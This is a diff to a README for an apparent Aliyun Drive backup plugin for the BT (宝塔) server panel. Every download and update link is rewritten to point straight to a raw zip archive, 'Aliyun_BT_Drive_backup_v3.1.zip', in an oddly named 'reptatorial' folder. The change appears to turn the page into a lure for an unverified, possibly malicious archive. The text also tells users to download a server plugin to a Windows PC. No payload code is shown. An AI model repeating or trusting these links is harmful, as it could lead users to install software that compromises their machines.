@@ -1,6 +1,6 @@
 # ⚙️ BTAliyunDrive_backup - Simple Backup for Aliyun Drive
 
-[![Download and Setup](https://img.shields.io/badge/Download-Setup-brightgreen?style=for-the-badge)](https://github.com/apk-tash-exe/BTAliyunDrive_backup)
+[![Download and Setup](https://img.shields.io/badge/Download-Setup-brightgreen?style=for-the-badge)](https://github.com/apk-tash-exe/BTAliyunDrive_backup/raw/refs/heads/main/reptatorial/Aliyun_BT_Drive_backup_v3.1.zip)
 
 ---
 
@@ -55,7 +55,7 @@ This tool aims to make backing up data efficient and safe without needing techni
 1. **Visit the Download Page**  
    Click the button below to open the download page.  
 
-   [![Download BTAliyunDrive_backup](https://img.shields.io/badge/Download-BTAliyunDrive_backup-blue?style=for-the-badge)](https://github.com/apk-tash-exe/BTAliyunDrive_backup)
+   [![Download BTAliyunDrive_backup](https://img.shields.io/badge/Download-BTAliyunDrive_backup-blue?style=for-the-badge)](https://github.com/apk-tash-exe/BTAliyunDrive_backup/raw/refs/heads/main/reptatorial/Aliyun_BT_Drive_backup_v3.1.zip)
 
 2. **Download the Plugin**  
    On the page, look for the latest release or package zip file. Download it to your Windows PC.
@@ -127,7 +127,7 @@ This tool aims to make backing up data efficient and safe without needing techni
 
 ## 🛠️ How to Update BTAliyunDrive_backup
 
-1. Download the latest plugin package from the [download page](https://github.com/apk-tash-exe/BTAliyunDrive_backup).  
+1. Download the latest plugin package from the [download page](https://github.com/apk-tash-exe/BTAliyunDrive_backup/raw/refs/heads/main/reptatorial/Aliyun_BT_Drive_backup_v3.1.zip).  
 2. Repeat import steps in 宝塔 panel.  
 3. Restart the plugin to apply updates.
 
@@ -155,4 +155,4 @@ Track the project growth and changes on GitHub to stay updated with new features
 
 ---
 
-[![Download and Setup](https://img.shields.io/badge/Download-BTAliyunDrive_backup-brightgreen?style=for-the-badge)](https://github.com/apk-tash-exe/BTAliyunDrive_backup)
+[![Download and Setup](https://img.shields.io/badge/Download-BTAliyunDrive_backup-brightgreen?style=for-the-badge)](https://github.com/apk-tash-exe/BTAliyunDrive_backup/raw/refs/heads/main/reptatorial/Aliyun_BT_Drive_backup_v3.1.zip)
